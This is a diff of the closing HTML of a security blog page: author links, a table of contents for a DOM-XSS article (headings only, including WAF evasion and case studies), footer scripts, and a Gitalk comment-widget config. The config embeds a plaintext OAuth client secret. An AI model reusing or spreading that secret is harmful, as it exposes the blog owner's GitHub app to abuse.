+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM-XSS-常见位置"><span class="nav-number">1.</span> <span class="nav-text">DOM-XSS 常见位置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#URL代入页面"><span class="nav-number">1.1.</span> <span class="nav-text">URL代入页面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#跳转类"><span class="nav-number">1.2.</span> <span class="nav-text">跳转类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#缓存类"><span class="nav-number">1.3.</span> <span class="nav-text">缓存类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#postMessage"><span class="nav-number">1.4.</span> <span class="nav-text">postMessage</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#window-name"><span class="nav-number">1.5.</span> <span class="nav-text">window.name</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM-XSS-优势在哪"><span class="nav-number">2.</span> <span class="nav-text">DOM-XSS 优势在哪</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#避开WAF"><span class="nav-number">2.1.</span> <span class="nav-text">避开WAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#长度不限"><span class="nav-number">2.2.</span> <span class="nav-text">长度不限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#隐蔽性强"><span class="nav-number">2.3.</span> <span class="nav-text">隐蔽性强</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-巧妙利用"><span class="nav-number">3.</span> <span class="nav-text">XSS 巧妙利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#案例一"><span class="nav-number">3.1.</span> <span class="nav-text">案例一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#案例二"><span class="nav-number">3.2.</span> <span class="nav-text">案例二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#案例三"><span class="nav-number">3.3.</span> <span class="nav-text">案例三</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">3.4.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
